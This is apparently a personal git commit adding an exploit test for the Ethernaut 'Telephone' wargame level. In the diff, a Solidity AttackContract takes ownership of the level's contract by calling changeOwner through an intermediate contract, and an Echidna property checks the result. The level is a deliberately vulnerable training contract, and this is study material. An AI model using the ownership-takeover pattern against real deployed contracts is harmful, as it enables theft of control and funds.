5ac729d584af8d5183710fc5e6c2f819fe9aa341
man715 <man715@webhack.localdomain>
2022-05-05 14:41:31 -0600

    vault backup: 2022-05-05 14:41:31

--- ethernaut/04-Telephone/Test.sol
+++ ethernaut/04-Telephone/Test.sol
@@ -1,8 +1,25 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.6.0;
 
-import './Telephone.sol'
+import './Telephone.sol';
+
+contract AttackContract {
+    constructor(address _sender) public {
+        Test telephone = Test(0x4242);
+        telephone.changeOwner(address(_sender));
+    }
+}
 
 contract Test is Telephone {
+    constructor() Telephone() public {
+        new AttackContract(address(0x4343));
+    }
 
+    function echidna_is_owner() public view returns(bool) {
+        if (owner == msg.sender) {
+            return false;
+        } else {
+            return true;
+        }
+    }
 }
